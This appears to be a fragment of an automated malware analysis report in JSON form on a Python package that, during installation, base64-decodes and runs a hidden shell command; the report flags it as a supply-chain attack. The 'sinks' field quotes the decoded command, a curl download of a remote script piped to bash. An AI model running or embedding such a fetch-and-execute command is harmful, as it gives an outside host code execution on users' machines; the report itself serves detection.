{
  "purpose": "The code executes a remote script during package installation by decoding a base64-encoded command and running it with os.system, indicating malicious intent.",
  "sources": "The base64-encoded string in b64d() function, decoded during notmalfunc(), which is called in the install process.",
  "sinks": "os.system call executing the decoded command, which runs 'curl -s http://192.168.1.3:8000/rev.sh | bash'.",
  "flows": "Base64 string decoded to a shell command, then passed to os.system for execution during the install phase.",
  "anomalies": "Use of base64 encoding to obfuscate a remote script download and execution; execution occurs during package installation without user consent.",
  "analysis": "The code contains a function that decodes a base64 string to a shell command that downloads and executes a remote script. This function is invoked during the package's install process, indicating malicious behavior. The base64 encoding is used to hide the command, which is a common tactic in malicious supply chain attacks. The remote URL points to an internal IP, suggesting control or malicious intent. The use of os.system to execute this command is dangerous, as it allows remote code execution. The overall structure and behavior are consistent with malicious activity, and the obfuscation level supports a high malware score. The security risk is high due to the potential for remote code execution, data exfiltration, or system compromise.",
  "conclusion": "The code is malicious, executing a remote script during installation, with obfuscation via base64 encoding. It poses a severe security threat and should be flagged accordingly.",
